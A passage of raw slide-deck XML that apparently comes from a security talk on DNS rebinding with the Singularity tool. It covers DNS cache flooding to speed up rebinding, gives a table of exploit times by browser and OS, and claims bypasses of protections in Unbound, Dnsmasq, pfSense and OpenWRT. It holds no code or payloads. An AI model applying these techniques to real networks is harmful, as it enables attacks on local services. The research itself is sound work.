                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: 2s - HTTP r</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>equest 3</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="377" name="Google Shape;377;p51"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6817500" y="3555300"/>
            <a:ext cx="572700" cy="572700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="378" name="Google Shape;378;p51"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124200" y="3810000"/>
            <a:ext cx="3204300" cy="1320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379" name="Google Shape;379;p51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3437250" y="3402900"/>
            <a:ext cx="25965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1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: 1s - HTTP request 2</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="380" name="Google Shape;380;p51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7434600" y="3631500"/>
            <a:ext cx="1169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accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Blocked</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t>!</a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="381" name="Google Shape;381;p51"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3128250" y="1540400"/>
            <a:ext cx="3214500" cy="1590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5" name="Shape 385"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="386" name="Google Shape;386;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Cache Flooding</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="387" name="Google Shape;387;p5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Multiple Answers works well for the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>loopback</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> (0.0.0.0 or 127.x.x.x) interface - inconsistent results for other target specifications.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>On Google Chrome or Safari/iOS platforms, when flooding the </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DNS cache with 1K+ queries</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> for which we receive valid answers, we observe DNS rebinding time with the time varying attack technique (first then second) of </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t> to 40 seconds</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>, a substantial progress over the average of ~60 seconds.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Flooding the cache is performed in a web worker.</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1" name="Shape 391"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="392" name="Google Shape;392;p53"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="633272" y="257636"/>
            <a:ext cx="7877477" cy="4430314"/>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6" name="Shape 396"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="397" name="Google Shape;397;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Speed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> Measured / Target Definition</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="398" name="Google Shape;398;p54"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="43225" y="1017725"/>
          <a:ext cx="3000000" cy="3000000"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr>
                <a:noFill/>
                <a:tableStyleId>{66E9546D-B0F6-4F7C-BB34-24EFF5FAE214}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1722050"/>
                <a:gridCol w="1502125"/>
                <a:gridCol w="1772275"/>
                <a:gridCol w="1399950"/>
                <a:gridCol w="1376800"/>
                <a:gridCol w="1284350"/>
              </a:tblGrid>
              <a:tr h="678150">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="115000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="1" lang="en">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Browser</a:t>
                      </a:r>
                      <a:endParaRPr b="1">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="91425" marR="68575" marL="68575">
                    <a:lnL cap="flat" cmpd="sng" w="12650">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a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>OS</a:t>
                      </a:r>
                      <a:endParaRPr b="1">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>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a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Strategy</a:t>
                      </a:r>
                      <a:endParaRPr b="1">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>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a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Time to Exploit</a:t>
                      </a:r>
                      <a:endParaRPr b="1">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>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a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Fetch Interval</a:t>
                      </a:r>
                      <a:endParaRPr b="1">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>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
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Target Spec</a:t>
                      </a:r>
                      <a:endParaRPr b="1">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="91425" marR="68575" marL="68575">
                    <a:lnL cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="666666"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnL>
                    <a:lnR cap="flat" cmpd="sng" w="12650">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solidFill>
                      <a:schemeClr val="dk2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="678150">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="115000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:t/>
                      </a:r>
                      <a:endParaRPr b="1"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="91425" marR="68575" marL="68575">
                    <a:lnL cap="flat" cmpd="sng" w="12650">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Windows 10</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MA</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 seconds</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 second</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127.0.0.1</a:t>
                      </a:r>
                      <a:endParaRPr/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="91425" marR="68575" marL="68575">
                    <a:lnL cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="666666"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnL>
                    <a:lnR cap="flat" cmpd="sng" w="12650">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r>
              <a:tr h="678150">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="115000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:t/>
                      </a:r>
                      <a:endParaRPr b="1"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="91425" marR="68575" marL="68575">
                    <a:lnL cap="flat" cmpd="sng" w="12650">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Ubuntu</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MA</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 seconds</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 second</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0.0.0.0</a:t>
                      </a:r>
                      <a:endParaRPr/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="91425" marR="68575" marL="68575">
                    <a:lnL cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="666666"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnL>
                    <a:lnR cap="flat" cmpd="sng" w="12650">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r>
              <a:tr h="678150">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="115000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:t/>
                      </a:r>
                      <a:endParaRPr b="1"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="91425" marR="68575" marL="68575">
                    <a:lnL cap="flat" cmpd="sng" w="12650">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macOS</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MA</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 seconds</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 second</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0.0.0.0</a:t>
                      </a:r>
                      <a:endParaRPr/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="91425" marR="68575" marL="68575">
                    <a:lnL cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="666666"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnL>
                    <a:lnR cap="flat" cmpd="sng" w="12650">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r>
              <a:tr h="678150">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="115000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:t/>
                      </a:r>
                      <a:endParaRPr b="1"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="91425" marR="68575" marL="68575">
                    <a:lnL cap="flat" cmpd="sng" w="12650">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macOS,Ubuntu, Windows</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FS+Cache Flooding</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15-40 seconds</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 second</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Any</a:t>
                      </a:r>
                      <a:endParaRPr/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="91425" marR="68575" marL="68575">
                    <a:lnL cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="666666"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnL>
                    <a:lnR cap="flat" cmpd="sng" w="12650">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r>
              <a:tr h="678150">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="115000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:t/>
                      </a:r>
                      <a:endParaRPr b="1"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="91425" marR="68575" marL="68575">
                    <a:lnL cap="flat" cmpd="sng" w="12650">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iOS</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FS+Cache Flooding</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5 seconds</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 second</a:t>
                      </a:r>
                      <a:endParaRPr/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="91425" marR="68575" marL="6857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Any</a:t>
                      </a:r>
                      <a:endParaRPr/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="91425" marR="68575" marL="68575">
                    <a:lnL cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="666666"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnL>
                    <a:lnR cap="flat" cmpd="sng" w="12650">
                      <a:solidFill>
                        <a:srgbClr val="666666"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnR>
                    <a:lnT cap="flat" cmpd="sng" w="12650">
                      <a:solidFill>
                        <a:srgbClr val="666666"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnT>
                    <a:lnB cap="flat" cmpd="sng" w="12650">
                      <a:solidFill>
                        <a:srgbClr val="666666"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="399" name="Google Shape;399;p54"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1274350" y="1753700"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="400" name="Google Shape;400;p54"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="701650" y="1753700"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="401" name="Google Shape;401;p54"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="128950" y="1753700"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="402" name="Google Shape;402;p54"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="128950" y="2476500"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="403" name="Google Shape;403;p54"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1274350" y="3143250"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="404" name="Google Shape;404;p54"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="701650" y="2476500"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="405" name="Google Shape;405;p54"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="701650" y="3143250"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="406" name="Google Shape;406;p54"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="128950" y="3143250"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="407" name="Google Shape;407;p54"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="128950" y="3857625"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="408" name="Google Shape;408;p54"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="128950" y="4532800"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="409" name="Google Shape;409;p54"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="701650" y="3857625"/>
            <a:ext cx="457200" cy="457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13" name="Shape 413"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="414" name="Google Shape;414;p55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="490250" y="450150"/>
            <a:ext cx="77166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Protection Bypasses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18" name="Shape 418"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="419" name="Google Shape;419;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Rebinding Protection Bypasses</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="420" name="Google Shape;420;p5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Singularity can bypass </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>all known </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>DNS rebinding protections:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>U</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>nbound</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Dnsmasq</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>pfSense</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>OpenWRT</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
